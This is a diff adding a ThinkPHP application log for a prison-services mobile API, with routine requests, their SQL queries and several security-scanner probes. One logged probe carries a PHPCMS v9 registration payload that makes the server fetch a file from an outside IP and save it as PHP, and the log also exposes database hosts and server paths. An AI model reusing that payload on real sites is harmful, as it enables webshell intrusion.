@@ -1,0 +1,5308 @@
+[ 2017-07-25T20:03:35+08:00 ] 60.205.45.195 219.146.198.25 POST /prisonapi/index/store_list
+[ log ] www.alroy.cn/prisonapi/index/store_list [运行时间：0.050840s][吞吐率：19.67req/s] [内存消耗：3,142.95kb] [文件加载：52]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'prisonapi',
+    1 => 'index',
+    2 => 'store_list',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '9',
+  'content-type' => 'application/x-www-form-urlencoded; charset=utf-8',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'www.alroy.cn',
+  'user-agent' => 'okhttp/3.6.0',
+)
+[ info ] [ PARAM ] array (
+  'currage' => '2',
+)
+[ info ] [ RUN ] app\prisonapi\controller\index->store_list[ /data/home/bxu2711760022/htdocs/application/prisonapi/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.006682s ] mysql:dbname=bdm290462451_db;host=bdm290462451.my3w.com;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `jy_goods` [ RunTime:0.002921s ]
+[ sql ] [ SQL ] SELECT * FROM `jy_goods` WHERE  (  is_sale=1 ) ORDER BY Id desc LIMIT 6,6 [ RunTime:0.002307s ]
+
+---------------------------------------------------------------
+[ 2017-07-25T20:44:15+08:00 ] 60.205.45.195 140.205.201.30 POST /index.php?m=member&c=index&a=register&siteid=1
+[ log ] alroy.cn:80/index.php?m=member&c=index&a=register&siteid=1 [运行时间：0.034820s][吞吐率：28.72req/s] [内存消耗：2,232.29kb] [文件加载：46]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '171',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'accept-encoding' => 'identity',
+  'connection' => 'close',
+  'host' => 'alroy.cn:80',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-register-upload)',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'member',
+  'c' => 'index',
+  'a' => 'register',
+  'siteid' => '1',
+  'modelid' => '11',
+  'username' => 'cmpyztou',
+  'password' => 'cmpyztou',
+  'email' => 'cmpyztou@aliyun.com',
+  'info' => 
+  array (
+    'content' => '<img src=http://120.26.55.211/s.txt?.php#.jpg>',
+  ),
+  'dosubmit' => '1',
+  'protocol' => '',
+)
+[ info ] [ RUN ] app\admin\controller\Login->index[ /data/home/bxu2711760022/htdocs/application/admin/controller/Login.php ]
+[ info ] [ VIEW ] /data/home/bxu2711760022/htdocs/application/admin/view/login/index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T20:44:32+08:00 ] 60.205.45.195 140.205.201.30 GET /index.php?m=wap&a=index&siteid=1
+[ log ] alroy.cn:80/index.php?m=wap&a=index&siteid=1 [运行时间：0.030584s][吞吐率：32.70req/s] [内存消耗：2,230.18kb] [文件加载：46]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'connection' => 'close',
+  'host' => 'alroy.cn:80',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'wap',
+  'a' => 'index',
+  'siteid' => '1',
+)
+[ info ] [ RUN ] app\admin\controller\Login->index[ /data/home/bxu2711760022/htdocs/application/admin/controller/Login.php ]
+[ info ] [ VIEW ] /data/home/bxu2711760022/htdocs/application/admin/view/login/index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:21:55+08:00 ] 60.205.45.195 112.224.20.151 POST /prisonapi/index/sign_add
+[ log ] www.alroy.cn/prisonapi/index/sign_add [运行时间：0.057016s][吞吐率：17.54req/s] [内存消耗：3,028.34kb] [文件加载：49]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'prisonapi',
+    1 => 'index',
+    2 => 'sign_add',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '15',
+  'content-type' => 'application/json; charset=utf-8',
+  'accept' => 'application/json',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'www.alroy.cn',
+  'user-agent' => 'okhttp/3.4.1',
+)
+[ info ] [ PARAM ] array (
+  'userid' => '29',
+)
+[ info ] [ RUN ] app\prisonapi\controller\index->sign_add[ /data/home/bxu2711760022/htdocs/application/prisonapi/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.012554s ] mysql:dbname=bdm290462451_db;host=bdm290462451.my3w.com;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `jy_sign` [ RunTime:0.003257s ]
+[ sql ] [ SQL ] SELECT * FROM `jy_sign` WHERE  `mid` = 29 ORDER BY Id desc LIMIT 1 [ RunTime:0.002455s ]
+
+---------------------------------------------------------------
+[ 2017-07-25T22:22:13+08:00 ] 60.205.45.195 112.224.20.151 POST /prisonapi/index/sign_none_add
+[ log ] www.alroy.cn/prisonapi/index/sign_none_add [运行时间：0.057423s][吞吐率：17.41req/s] [内存消耗：3,139.98kb] [文件加载：52]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'prisonapi',
+    1 => 'index',
+    2 => 'sign_none_add',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '15',
+  'content-type' => 'application/json; charset=utf-8',
+  'accept' => 'application/json',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'www.alroy.cn',
+  'user-agent' => 'okhttp/3.4.1',
+)
+[ info ] [ PARAM ] array (
+  'userid' => '29',
+)
+[ info ] [ RUN ] app\prisonapi\controller\index->sign_none_add[ /data/home/bxu2711760022/htdocs/application/prisonapi/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.008088s ] mysql:dbname=bdm290462451_db;host=bdm290462451.my3w.com;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `jy_sign` [ RunTime:0.003278s ]
+[ sql ] [ SQL ] SELECT `pubdate` FROM `jy_sign` WHERE  (  mid=29 and state=1 and month=7 ) [ RunTime:0.002678s ]
+
+---------------------------------------------------------------
+[ 2017-07-25T22:22:16+08:00 ] 60.205.45.195 112.224.20.151 POST /prisonapi/index/sign_list
+[ log ] www.alroy.cn/prisonapi/index/sign_list [运行时间：0.055118s][吞吐率：18.14req/s] [内存消耗：3,141.55kb] [文件加载：52]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'prisonapi',
+    1 => 'index',
+    2 => 'sign_list',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '15',
+  'content-type' => 'application/json; charset=utf-8',
+  'accept' => 'application/json',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'www.alroy.cn',
+  'user-agent' => 'okhttp/3.4.1',
+)
+[ info ] [ PARAM ] array (
+  'userid' => '29',
+)
+[ info ] [ RUN ] app\prisonapi\controller\index->sign_list[ /data/home/bxu2711760022/htdocs/application/prisonapi/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.007799s ] mysql:dbname=bdm290462451_db;host=bdm290462451.my3w.com;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `jy_sign` [ RunTime:0.003000s ]
+[ sql ] [ SQL ] SELECT * FROM `jy_sign` WHERE  (  mid=29 and state=1 ) ORDER BY Id desc [ RunTime:0.002510s ]
+
+---------------------------------------------------------------
+[ 2017-07-25T22:22:31+08:00 ] 60.205.45.195 112.224.20.151 POST /prisonapi/index/userinfo
+[ log ] www.alroy.cn/prisonapi/index/userinfo [运行时间：0.050912s][吞吐率：19.64req/s] [内存消耗：3,145.95kb] [文件加载：52]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'prisonapi',
+    1 => 'index',
+    2 => 'userinfo',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '15',
+  'content-type' => 'application/json; charset=utf-8',
+  'accept' => 'application/json',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'www.alroy.cn',
+  'user-agent' => 'okhttp/3.4.1',
+)
+[ info ] [ PARAM ] array (
+  'userid' => '29',
+)
+[ info ] [ RUN ] app\prisonapi\controller\index->userinfo[ /data/home/bxu2711760022/htdocs/application/prisonapi/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.006298s ] mysql:dbname=bdm290462451_db;host=bdm290462451.my3w.com;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `jy_suspect` [ RunTime:0.002921s ]
+[ sql ] [ SQL ] SELECT * FROM `jy_suspect` WHERE  `Id` = 29 LIMIT 1 [ RunTime:0.002401s ]
+
+---------------------------------------------------------------
+[ 2017-07-25T22:22:33+08:00 ] 60.205.45.195 112.224.20.151 POST /prisonapi/index/store_list
+[ log ] www.alroy.cn/prisonapi/index/store_list [运行时间：0.051504s][吞吐率：19.42req/s] [内存消耗：3,143.05kb] [文件加载：52]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'prisonapi',
+    1 => 'index',
+    2 => 'store_list',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '9',
+  'content-type' => 'application/x-www-form-urlencoded; charset=utf-8',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'www.alroy.cn',
+  'user-agent' => 'okhttp/3.4.1',
+)
+[ info ] [ PARAM ] array (
+  'currage' => '1',
+)
+[ info ] [ RUN ] app\prisonapi\controller\index->store_list[ /data/home/bxu2711760022/htdocs/application/prisonapi/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.007197s ] mysql:dbname=bdm290462451_db;host=bdm290462451.my3w.com;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `jy_goods` [ RunTime:0.003507s ]
+[ sql ] [ SQL ] SELECT * FROM `jy_goods` WHERE  (  is_sale=1 ) ORDER BY Id desc LIMIT 0,6 [ RunTime:0.002644s ]
+
+---------------------------------------------------------------
+[ 2017-07-25T22:22:33+08:00 ] 60.205.45.195 112.224.20.151 POST /prisonapi/index/store_list
+[ log ] www.alroy.cn/prisonapi/index/store_list [运行时间：0.049634s][吞吐率：20.15req/s] [内存消耗：3,143.02kb] [文件加载：52]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'prisonapi',
+    1 => 'index',
+    2 => 'store_list',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '9',
+  'content-type' => 'application/x-www-form-urlencoded; charset=utf-8',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'www.alroy.cn',
+  'user-agent' => 'okhttp/3.4.1',
+)
+[ info ] [ PARAM ] array (
+  'currage' => '2',
+)
+[ info ] [ RUN ] app\prisonapi\controller\index->store_list[ /data/home/bxu2711760022/htdocs/application/prisonapi/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.006761s ] mysql:dbname=bdm290462451_db;host=bdm290462451.my3w.com;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `jy_goods` [ RunTime:0.003110s ]
+[ sql ] [ SQL ] SELECT * FROM `jy_goods` WHERE  (  is_sale=1 ) ORDER BY Id desc LIMIT 6,6 [ RunTime:0.002590s ]
+
+---------------------------------------------------------------
+[ 2017-07-25T22:22:47+08:00 ] 60.205.45.195 112.224.20.151 POST /prisonapi/index/law_list
+[ log ] www.alroy.cn/prisonapi/index/law_list [运行时间：0.054272s][吞吐率：18.43req/s] [内存消耗：3,349.59kb] [文件加载：52]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'prisonapi',
+    1 => 'index',
+    2 => 'law_list',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '9',
+  'content-type' => 'application/x-www-form-urlencoded; charset=utf-8',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'www.alroy.cn',
+  'user-agent' => 'okhttp/3.4.1',
+)
+[ info ] [ PARAM ] array (
+  'currage' => '1',
+)
+[ info ] [ RUN ] app\prisonapi\controller\index->law_list[ /data/home/bxu2711760022/htdocs/application/prisonapi/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.007156s ] mysql:dbname=bdm290462451_db;host=bdm290462451.my3w.com;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `jy_law` [ RunTime:0.003373s ]
+[ sql ] [ SQL ] SELECT * FROM `jy_law` WHERE  (  cate=0 ) ORDER BY Id desc LIMIT 0,7 [ RunTime:0.004319s ]
+
+---------------------------------------------------------------
+[ 2017-07-25T22:22:56+08:00 ] 60.205.45.195 112.224.20.151 POST /prisonapi/index/sign_none_add
+[ log ] www.alroy.cn/prisonapi/index/sign_none_add [运行时间：0.052552s][吞吐率：19.03req/s] [内存消耗：3,139.98kb] [文件加载：52]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'prisonapi',
+    1 => 'index',
+    2 => 'sign_none_add',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '15',
+  'content-type' => 'application/json; charset=utf-8',
+  'accept' => 'application/json',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'www.alroy.cn',
+  'user-agent' => 'okhttp/3.4.1',
+)
+[ info ] [ PARAM ] array (
+  'userid' => '29',
+)
+[ info ] [ RUN ] app\prisonapi\controller\index->sign_none_add[ /data/home/bxu2711760022/htdocs/application/prisonapi/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.006985s ] mysql:dbname=bdm290462451_db;host=bdm290462451.my3w.com;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `jy_sign` [ RunTime:0.002861s ]
+[ sql ] [ SQL ] SELECT `pubdate` FROM `jy_sign` WHERE  (  mid=29 and state=1 and month=7 ) [ RunTime:0.002287s ]
+
+---------------------------------------------------------------
+[ 2017-07-25T22:22:59+08:00 ] 60.205.45.195 112.224.20.151 POST /prisonapi/index/store_list
+[ log ] www.alroy.cn/prisonapi/index/store_list [运行时间：0.052207s][吞吐率：19.15req/s] [内存消耗：3,143.05kb] [文件加载：52]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'prisonapi',
+    1 => 'index',
+    2 => 'store_list',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '9',
+  'content-type' => 'application/x-www-form-urlencoded; charset=utf-8',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'www.alroy.cn',
+  'user-agent' => 'okhttp/3.4.1',
+)
+[ info ] [ PARAM ] array (
+  'currage' => '1',
+)
+[ info ] [ RUN ] app\prisonapi\controller\index->store_list[ /data/home/bxu2711760022/htdocs/application/prisonapi/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.006719s ] mysql:dbname=bdm290462451_db;host=bdm290462451.my3w.com;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `jy_goods` [ RunTime:0.003216s ]
+[ sql ] [ SQL ] SELECT * FROM `jy_goods` WHERE  (  is_sale=1 ) ORDER BY Id desc LIMIT 0,6 [ RunTime:0.002402s ]
+
+---------------------------------------------------------------
+[ 2017-07-25T22:22:59+08:00 ] 60.205.45.195 112.224.20.151 POST /prisonapi/index/store_list
+[ log ] www.alroy.cn/prisonapi/index/store_list [运行时间：0.049461s][吞吐率：20.22req/s] [内存消耗：3,143.02kb] [文件加载：52]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'prisonapi',
+    1 => 'index',
+    2 => 'store_list',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '9',
+  'content-type' => 'application/x-www-form-urlencoded; charset=utf-8',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'www.alroy.cn',
+  'user-agent' => 'okhttp/3.4.1',
+)
+[ info ] [ PARAM ] array (
+  'currage' => '2',
+)
+[ info ] [ RUN ] app\prisonapi\controller\index->store_list[ /data/home/bxu2711760022/htdocs/application/prisonapi/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.006240s ] mysql:dbname=bdm290462451_db;host=bdm290462451.my3w.com;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `jy_goods` [ RunTime:0.002869s ]
+[ sql ] [ SQL ] SELECT * FROM `jy_goods` WHERE  (  is_sale=1 ) ORDER BY Id desc LIMIT 6,6 [ RunTime:0.002238s ]
+
+---------------------------------------------------------------
+[ 2017-07-25T22:23:19+08:00 ] 60.205.45.195 112.224.20.151 POST /prisonapi/index/sign_none_add
+[ log ] www.alroy.cn/prisonapi/index/sign_none_add [运行时间：0.053221s][吞吐率：18.79req/s] [内存消耗：3,139.98kb] [文件加载：52]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'prisonapi',
+    1 => 'index',
+    2 => 'sign_none_add',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '15',
+  'content-type' => 'application/json; charset=utf-8',
+  'accept' => 'application/json',
+  'accept-encoding' => 'gzip',
+  'connection' => 'Keep-Alive',
+  'host' => 'www.alroy.cn',
+  'user-agent' => 'okhttp/3.4.1',
+)
+[ info ] [ PARAM ] array (
+  'userid' => '29',
+)
+[ info ] [ RUN ] app\prisonapi\controller\index->sign_none_add[ /data/home/bxu2711760022/htdocs/application/prisonapi/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.006342s ] mysql:dbname=bdm290462451_db;host=bdm290462451.my3w.com;port=3306;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `jy_sign` [ RunTime:0.002772s ]
+[ sql ] [ SQL ] SELECT `pubdate` FROM `jy_sign` WHERE  (  mid=29 and state=1 and month=7 ) [ RunTime:0.002163s ]
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:04+08:00 ] 60.205.45.195 140.205.201.41 GET /
+[ log ] alroy.cn/ [运行时间：0.041486s][吞吐率：24.10req/s] [内存消耗：2,229.55kb] [文件加载：46]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip,deflate',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'referer' => 'http://alroy.cn/',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\admin\controller\Login->index[ /data/home/bxu2711760022/htdocs/application/admin/controller/Login.php ]
+[ info ] [ VIEW ] /data/home/bxu2711760022/htdocs/application/admin/view/login/index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:04+08:00 ] 60.205.45.195 140.205.201.41 GET /admin/images/menu-current-arrow.gif
+[ log ] alroy.cn/admin/images/menu-current-arrow.gif [运行时间：0.026540s][吞吐率：37.68req/s] [内存消耗：1,839.57kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'images',
+    2 => 'menu-current-arrow.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:04+08:00 ] 60.205.45.195 140.205.201.41 GET /install/images/default/top1_r.jpg
+[ log ] alroy.cn/install/images/default/top1_r.jpg [运行时间：0.028413s][吞吐率：35.20req/s] [内存消耗：1,838.54kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'install',
+    1 => 'images',
+    2 => 'default',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:04+08:00 ] 60.205.45.195 140.205.201.41 GET /images/default/hd_a1.gif
+[ log ] alroy.cn/images/default/hd_a1.gif [运行时间：0.026881s][吞吐率：37.20req/s] [内存消耗：1,838.73kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'images',
+    1 => 'default',
+    2 => 'hd_a1.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:05+08:00 ] 60.205.45.195 140.205.201.41 GET /upload/200812/20081230023106860.gif
+[ log ] alroy.cn/upload/200812/20081230023106860.gif [运行时间：0.027459s][吞吐率：36.42req/s] [内存消耗：1,838.54kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'upload',
+    1 => '200812',
+    2 => '20081230023106860.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:05+08:00 ] 60.205.45.195 140.205.201.41 GET /Images/Mlogin/Bitmap02.gif
+[ log ] alroy.cn/Images/Mlogin/Bitmap02.gif [运行时间：0.028748s][吞吐率：34.78req/s] [内存消耗：1,838.55kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'Images',
+    1 => 'Mlogin',
+    2 => 'Bitmap02.gif',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:05+08:00 ] 60.205.45.195 140.205.201.41 GET /admin/image/menu_h4.png
+[ log ] alroy.cn/admin/image/menu_h4.png [运行时间：0.029562s][吞吐率：33.83req/s] [内存消耗：1,839.59kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'image',
+    2 => 'menu_h4.png',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:06+08:00 ] 60.205.45.195 140.205.201.41 GET /images/list_bg.png
+[ log ] alroy.cn/images/list_bg.png [运行时间：0.026597s][吞吐率：37.60req/s] [内存消耗：1,838.55kb] [文件加载：40]
+[ info ] [ LANG ] /data/home/bxu2711760022/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'images',
+    1 => 'list_bg.png',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
+  'cache-control' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'alroy.cn',
+  'pragma' => 'no-cache',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-07-25T22:50:06+08:00 ] 60.205.45.195 140.205.201.41 GET /theme/theme/default/images/bg_bnt_user_base_over.gif
+[ log ] alroy.cn/theme/theme/default/images/bg_bnt_user_base_over.gif [运行时间：0.025580s][吞吐率：39.09req/s] [内存消耗：1,839.30kb] [文件加载：40]
